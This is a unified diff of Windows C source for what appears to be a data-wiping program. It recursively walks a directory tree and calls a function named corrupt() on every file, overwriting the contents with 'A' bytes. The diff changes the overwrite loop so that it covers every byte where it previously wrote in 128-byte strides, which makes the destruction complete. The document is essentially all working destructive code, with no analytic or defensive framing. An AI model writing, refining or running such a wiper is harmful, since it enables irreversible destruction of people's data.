@@ -4,7 +4,6 @@ u_long FileSizeByName(wchar_t *sFileName)
 {
 	FILE *fp = NULL;
 	wprintf_s(L"sFileName is: %s\n", sFileName);
-	///////////////////////////////////////////
 	if(_wfopen_s(&fp, sFileName, L"r")!=0)
 	{
 		wprintf_s(L"Error opening file for READING: %s\n", sFileName);
@@ -14,8 +13,10 @@ u_long FileSizeByName(wchar_t *sFileName)
 	hFile = (HANDLE)_get_osfhandle(_fileno(fp)); // get handle associated with specific file descriptor (get file descriptor from stream)
 	u_long  iFileSize = 0;
 	iFileSize = GetFileSize(hFile, NULL);
-	CloseHandle(hFile);
 	fclose(fp);
+	#ifndef DEBUG
+	//CloseHandle(hFile); // this will ALWAYS throw an exception if run under a debugger
+	#endif
 	wprintf_s(L"File Size: %d\r\n", iFileSize);
 	return iFileSize;
 }
@@ -31,10 +32,10 @@ bool corrupt(wchar_t *sTarget)
 		return 1;
 	}
 
-	for (long i=0 ; i < (long)iFileSize ; i=i+128)
+	for (long i=0 ; i < (long)iFileSize ; i++)
 	{
 		fseek ( fp , i, SEEK_SET );
-		fputs("\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",fp);
+		fputs("\x41",fp);
 	}
 	fclose(fp);
 	return TRUE;
@@ -42,7 +43,7 @@ bool corrupt(wchar_t *sTarget)
 
 int ListDirectoryContents(const wchar_t *sDir)
 { 
-	WIN32_FIND_DATA FindFileData;
+	WIN32_FIND_DATA FindFileData ={0};
 	HANDLE hFind = INVALID_HANDLE_VALUE; 
 	wchar_t sPath[MAX_PATH] = {0}; 
 
@@ -53,7 +54,7 @@ int ListDirectoryContents(const wchar_t *sDir)
 	if(INVALID_HANDLE_VALUE == hFind )
 	{ 
 		wprintf_s(L"Path not found: [%s]\n", sDir); 
-		return false; 
+		return 1; 
 	} 
 
 	do
@@ -66,17 +67,18 @@ int ListDirectoryContents(const wchar_t *sDir)
 			if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
 			{ 
 				wprintf_s(L"Directory: %s\n", sPath); 
-				ListDirectoryContents(sPath); //Recursion, I love it! 
+				ListDirectoryContents(sPath); //Recursion, we love it! 
 			} 
 			else{ 
 				wprintf_s(L"File: %s\n", sPath); 
+				double size = FindFileData.nFileSizeLow;
 				corrupt(sPath);
 			} 
 		}
 	} 
 	while(FindNextFile(hFind, &FindFileData)); //Find the next file. 
 	FindClose(hFind); //Always, Always, clean things up! 
-	return true; 
+	return 0; 
 } 
 
 
@@ -88,7 +90,7 @@ int _tmain(int argc, TCHAR *argv[])
 
 	if(argc != 2)
 	{
-		GetCurrentDirectoryW(MAX_PATH, cDstDir);
+		GetCurrentDirectory(MAX_PATH, cDstDir);
 		//StringCchCopy(cDstDir, MAX_PATH, TEXT("c:"));
 	}
 	else
